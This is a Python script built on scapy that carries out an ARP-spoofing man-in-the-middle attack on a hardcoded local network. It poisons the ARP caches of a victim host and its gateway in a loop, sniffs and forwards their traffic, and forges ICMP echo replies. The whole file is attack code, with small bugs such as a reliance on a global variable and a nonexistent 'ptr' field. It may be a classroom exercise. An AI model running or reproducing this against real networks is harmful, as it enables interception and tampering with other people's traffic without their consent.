import scapy.all as scapy  # using the scapy lib
import time  # time.sleep
from scapy.layers.inet import IP, ICMP, Ether, TCP  # convienince
import threading  # function threads

# function that gets mac address with a given key


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    responselist = scapy.srp(arp_req_broadcast, timeout=5, verbose=False)[0]
    return responselist[0][1].hwsrc if responselist else None

# function changes arp tables pairings => spoofing


def spoof(target_ip, spoof_ip, target_mac):
    new_packet = scapy.ARP(op=2, pdst=target_ip,
                           hwdst=target_mac,
                           psrc=spoof_ip)
    scapy.send(new_packet, verbose=False)

# sniffer thread to work infinitly


def my_sniffer(my_mac, target_mac, host_ip, dest_ip):
    while True:
        scapy.sniff(filter=f"ether src {target_mac}",
                    prn=lambda packet: forward_packet(packet, my_mac, target_mac, host_ip, dest_ip), count=1)


def my_spoofer(gateway_ip, attcked_ip, target_mac, gateway_mac):
    while True:
        spoof(gateway_ip, attcked_ip, target_mac)
        spoof(attcked_ip, gateway_ip, gateway_mac)
        time.sleep(3)

# function checks whether a given packet is a ping request
# if it is a ping the function ops to crrupt it and send it back
# all other packet it forwards to the destantion altering the mac addresses


def forward_packet(packet, my_mac, target_mac, source_ip, dest_ip):
    if packet.haslayer(ICMP) and packet[IP].dst == dest_ip and packet[ICMP].type == 8:
        tamper_response(packet, source_ip, dest_ip, gateway_mac)
    elif packet.haslayer(ICMP) and packet[IP].dst == source_ip and packet[ICMP].type == 8:
        tamper_response(packet, dest_ip, source_ip, target_mac)
    elif not ((packet.haslayer(ICMP) and packet[ICMP].type == 0) or (packet.haslayer((scapy.ARP)))):
        packet[Ether].src = my_mac
        packet[Ether].dst = target_mac
        scapy.sendp(packet)

# function starts all threads one for spoofing
# one for sniffing source to dest packets
# one for sniffing dest to source packets


def intercept(gateway_ip, attcked_ip, my_mac, gateway_mac, target_mac):
    try:
        victim_sniffer = threading.Thread(target=my_sniffer, args=(
            my_mac, gateway_mac, attcked_ip, gateway_ip))
        victim_sniffer.start()
        gateway_sniffer = threading.Thread(target=my_sniffer, args=(
            my_mac, target_mac, gateway_ip, attcked_ip))
        gateway_sniffer.start()
        spoofer = threading.Thread(target=my_spoofer, args=(
            gateway_ip, attcked_ip, target_mac, gateway_mac))
        spoofer.start()
    except KeyboardInterrupt:
        print("\n\nDONE MIDDLEMANNING")

# function to tamper with pings ip and send it back to its owner


def tamper_response(packet, target_ip, gateway_ip, target_mac):
    packet[IP].src = gateway_ip
    packet[IP].dst = target_ip
    packet[Ether].dst = target_mac
    packet[Ether].src, packet[Ether].dst = packet[Ether].dst, packet[Ether].src
    packet[ICMP].type = 0
    packet.ptr = 'C'
    del packet[IP].chksum
    del packet[ICMP].chksum
    scapy.sendp(packet)


# execution start point

if __name__ == "__main__":
    attcked_ip = "192.168.2.15"
    attacker_ip = "192.168.2.14"
    gateway_ip = "192.168.2.1"
    my_mac = "00:0c:29:7a:39:2a"

    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(attcked_ip)
    intercept(gateway_ip, attcked_ip, my_mac, gateway_mac, target_mac)
